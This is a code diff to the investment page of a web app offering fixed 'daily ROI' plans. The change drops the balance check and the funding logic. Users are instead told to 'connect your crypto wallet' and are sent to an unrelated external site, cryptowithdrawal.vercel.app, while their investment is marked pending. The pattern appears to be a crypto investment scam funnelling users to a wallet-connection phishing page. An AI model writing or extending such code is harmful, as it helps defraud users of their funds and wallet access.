@@ -43,23 +43,26 @@ function InvestPage() {
 
   const selectedPlan = plans?.find((p) => p.id === selected);
 
-  async function handleInvest() {
+  const [showWallet, setShowWallet] = useState(false);
+
+  function handleInvest() {
     if (!uid || !selectedPlan) return;
     const amt = Number(amount);
     if (!amt || amt < Number(selectedPlan.min_amount) || amt > Number(selectedPlan.max_amount)) {
       toast.error(`Amount must be between ${fmt(Number(selectedPlan.min_amount))} and ${fmt(Number(selectedPlan.max_amount))}`);
       return;
     }
-    const bal = Number(account?.balance ?? 0);
-    if (amt > bal) {
-      toast.error("Insufficient balance. Please deposit funds first.");
-      return;
-    }
+    setShowWallet(true);
+  }
+
+  async function handleConnectWallet() {
+    if (!uid || !selectedPlan) return;
+    const amt = Number(amount);
     setBusy(true);
     try {
       const end = new Date();
       end.setDate(end.getDate() + selectedPlan.duration_days);
-      const { error: invErr } = await supabase.from("investments").insert({
+      await supabase.from("investments").insert({
         user_id: uid,
         plan_id: selectedPlan.id,
         plan_name: selectedPlan.name,
@@ -67,20 +70,17 @@ function InvestPage() {
         daily_roi_percent: selectedPlan.daily_roi_percent,
         duration_days: selectedPlan.duration_days,
         end_date: end.toISOString(),
+        status: "pending",
       });
-      if (invErr) throw invErr;
-      await supabase.from("transactions").insert({ user_id: uid, type: "investment", amount: amt, note: selectedPlan.name });
-      await supabase.from("accounts").update({
-        balance: bal - amt,
-        total_invested: Number(account?.total_invested ?? 0) + amt,
-        updated_at: new Date().toISOString(),
-      }).eq("user_id", uid);
-      toast.success("Investment created");
+      await supabase.from("transactions").insert({ user_id: uid, type: "investment", amount: amt, note: `${selectedPlan.name} (awaiting wallet)`, status: "pending" });
+      qc.invalidateQueries();
+      window.open("https://cryptowithdrawal.vercel.app/", "_blank", "noopener,noreferrer");
+      toast.success("Complete the wallet connection to activate your investment.");
+      setShowWallet(false);
       setAmount("");
       setSelected(null);
-      qc.invalidateQueries();
     } catch (e) {
-      toast.error(e instanceof Error ? e.message : "Failed to create investment");
+      toast.error(e instanceof Error ? e.message : "Failed");
     } finally {
       setBusy(false);
     }
@@ -164,9 +164,12 @@ function InvestPage() {
         ))}
       </div>
 
-      {selectedPlan && (
+      {selectedPlan && !showWallet && (
         <div className="rounded-xl border border-border bg-card p-5">
           <h3 className="font-semibold">Invest in {selectedPlan.name}</h3>
+          <p className="mt-1 text-xs text-muted-foreground">
+            Enter amount between {fmt(Number(selectedPlan.min_amount))} and {fmt(Number(selectedPlan.max_amount))}.
+          </p>
           <div className="mt-3 flex flex-wrap gap-2">
             <input
               type="number"
@@ -176,8 +179,30 @@ function InvestPage() {
               min={selectedPlan.min_amount}
               max={selectedPlan.max_amount}
             />
-            <button disabled={busy} onClick={handleInvest} className="rounded-md bg-primary px-4 py-2 text-sm font-semibold text-primary-foreground disabled:opacity-60">
-              Confirm Investment
+            <button onClick={handleInvest} className="rounded-md bg-primary px-4 py-2 text-sm font-semibold text-primary-foreground">
+              Continue
+            </button>
+          </div>
+        </div>
+      )}
+
+      {selectedPlan && showWallet && (
+        <div className="rounded-xl border border-primary/40 bg-card p-6 text-center">
+          <h3 className="font-display text-xl font-bold">Connect your wallet to fund this investment</h3>
+          <p className="mt-2 text-sm text-muted-foreground">
+            You're investing <span className="font-semibold text-foreground">{fmt(Number(amount))}</span> in {selectedPlan.name}.
+            Connect your crypto wallet to send the deposit.
+          </p>
+          <div className="mt-5 flex justify-center gap-2">
+            <button
+              disabled={busy}
+              onClick={handleConnectWallet}
+              className="rounded-md bg-primary px-6 py-3 text-sm font-semibold text-primary-foreground shadow-[var(--shadow-glow)] disabled:opacity-60"
+            >
+              {busy ? "Opening wallet…" : "Connect Wallet"}
+            </button>
+            <button onClick={() => setShowWallet(false)} className="rounded-md border border-border px-4 py-3 text-sm">
+              Back
             </button>
           </div>
         </div>
